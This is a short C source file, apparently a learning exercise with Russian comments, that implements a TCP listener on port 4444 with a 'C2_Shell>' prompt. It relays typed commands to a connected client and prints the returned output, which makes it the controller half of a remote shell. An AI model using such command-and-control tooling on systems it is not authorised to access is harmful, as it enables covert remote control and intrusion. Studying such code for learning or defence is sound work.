#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define MAXLINE 1024


int main() {
    int listenfd, connfd; //listenfd - это слушающий сокет (дескриптор), connfd - это присоединённый сокет
    socklen_t clilen; //размер структуры адреса клиента
    struct sockaddr_in cliaddr, servaddr; //servaddr — это настройки адреса сервера (какой порт слушать),  cliaddr - это IP-адрес и порт клиента
    char buf[MAXLINE]; //массив для хранения данных полученных от клиента
    ssize_t n; //фактическое количество данных полученных из буфера 

    listenfd = socket(AF_INET, SOCK_STREAM, 0);
    if (listenfd < 0) {
        perror("Ошибка - не получилось создать socket");
        exit(1);
    }

    memset(&servaddr, 0, sizeof(servaddr));

    servaddr.sin_family = AF_INET;
    servaddr.sin_addr.s_addr = htonl(INADDR_ANY); //32-разрядный адрес ipv4
    servaddr.sin_port = htons(4444); //16-разрядный номер порта ТСР

    int bind_status = bind(listenfd, (const struct sockaddr *) &servaddr, sizeof(servaddr));
    if (bind_status < 0) {
        perror("Ошибка в bind");
        exit(1);
    }

    int listen_status = listen(listenfd, 10);
    if (listen_status < 0) {
        perror("Ошибка в функции listen");
        exit(1);
    }

    clilen = sizeof(cliaddr);
    connfd = accept(listenfd, (struct sockaddr *) &cliaddr, &clilen);
    if (connfd < 0) {
        perror("Ошибка в accept");
        exit(1);
    }

    printf("подключение клиента прошло успешно\n");

    while (1) {
        printf("C2_Shell> ");
        fflush(stdout);

        if (fgets(buf, MAXLINE, stdin) == NULL) break;

        write(connfd, buf, strlen(buf));

        while(1) {
            n = read(connfd, buf, MAXLINE);
            if (n <= 0) {
                close(connfd);
                close(listenfd);
                perror("клиент закрыл соединение");
                exit(1);
            }

            if (buf[n - 1] == '\4') {
                buf[n - 1] = '\0'; // перезаписываем маркер из строки, чтобы не выводить на экран
                printf("%s", buf);
                break; // Прерываем чтение
            }
            
            buf[n] = '\0';
            printf("%s", buf);
            fflush(stdout);
        }
    }

    close(connfd); //выключаем присоединенного клиента
    close(listenfd); //вывключаем сам прослушиваюший сокет

    return 0;
}